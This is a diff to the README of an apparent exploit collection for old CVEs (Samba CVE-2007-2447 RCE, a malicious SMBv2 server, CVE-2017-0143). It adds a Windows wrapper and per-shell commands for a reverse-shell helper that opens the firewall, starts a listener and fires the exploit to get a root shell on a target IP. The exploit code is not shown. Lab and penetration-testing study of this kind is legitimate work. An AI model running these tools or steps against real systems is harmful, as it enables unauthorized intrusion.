@@ -10,6 +10,7 @@ cve-2007-2447/
   cve_2007_2447.py       Samba pre-auth RCE (works, verified)
   reverse_shell.sh       One-command reverse shell helper (opens the firewall,
                          picks the callback address, listens, fires the exploit)
+  reverse_shell.cmd      Windows wrapper — runs the .sh from cmd/PowerShell
 cve-2009-3103/
   cve_2009_3103_smbv2_server.py   Malicious SMBv2 server (crashes Windows clients)
 cve-2017-0143/
@@ -76,17 +77,26 @@ address, the local firewall, and the payload. All three are handled for you.
 
 ### One command
 
-```bash
-# From the attacker host (Git Bash on Windows, or a Linux shell)
-./cve-2007-2447/reverse_shell.sh <target_ip> [lport] [lhost]
+Pick the line for the shell you are actually in. This is the most common way to
+get stuck: a `.sh` has no Windows file association, so double-clicking one (or
+running it from cmd/PowerShell) just pops up a "choose an app" dialog.
 
-# e.g.
+```bash
+# Git Bash
 ./cve-2007-2447/reverse_shell.sh 192.168.200.132
+
+# cmd.exe
+cve-2007-2447\reverse_shell.cmd 192.168.200.132
+
+# PowerShell
+.\cve-2007-2447\reverse_shell.cmd 192.168.200.132
 ```
 
-It opens the firewall for the callback port, picks a callback address on the
-target's subnet, starts the listener, then fires the exploit. You land in a
-root shell — try `id; hostname; uname -a`, type `exit` to drop it.
+Arguments are `<target_ip> [lport] [lhost]` — the port defaults to 4444 and the
+callback address is auto-detected. It opens the firewall for the callback port,
+picks a callback address on the target's subnet, starts the listener, then
+fires the exploit. You land in a root shell — try `id; hostname; uname -a`,
+type `exit` to drop it.
 
 ### Manual equivalent
 
